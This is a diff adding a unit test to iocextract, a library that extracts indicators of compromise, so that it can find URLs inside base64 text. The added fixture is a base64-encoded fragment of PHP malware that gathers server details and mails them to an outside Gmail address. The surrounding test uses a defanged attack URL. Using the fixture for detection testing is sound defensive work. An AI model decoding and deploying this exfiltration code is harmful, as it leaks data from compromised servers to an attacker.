@@ -898,3 +898,8 @@ class TestExtractors(unittest.TestCase):
         # but not the bracket regex. Note the space termination in the second result:
         self.assertEqual(list(iocextract.extract_urls('hXXps:// 192.168.149[.]100/api/info')),
                          ['hXXps:// 192.168.149[.]100/api/info', '192.168.149[.]100/api/info'])
+
+    def test_base64_error_when_whitespace_in_leading_characters(self):
+        content = 'ZyBodHRwOi8vIi4kd2ViLiRpbmouIm5uU3ByZWFkIFZpYSA6ICIuJHZpc2l0b3IuIm5uS2VybmVsIFZlcnNpb24gOiAiLiRhcmFuLiJublNhZmUgTW9kZSA6ICIuJHNhZmVtb2RlOyBtYWlsKCJrYW1laGFtZS5kcmFnb25AZ21haWwuY29tIiwiU2V0b3JhbiBCb3MgIi4kc2FmZW1vZGUsJGJvZHksJGZsb2F0KTs='
+
+        self.assertIn('http://".$web.$inj."nnSpread', list(iocextract.extract_urls(content, refang=True)))
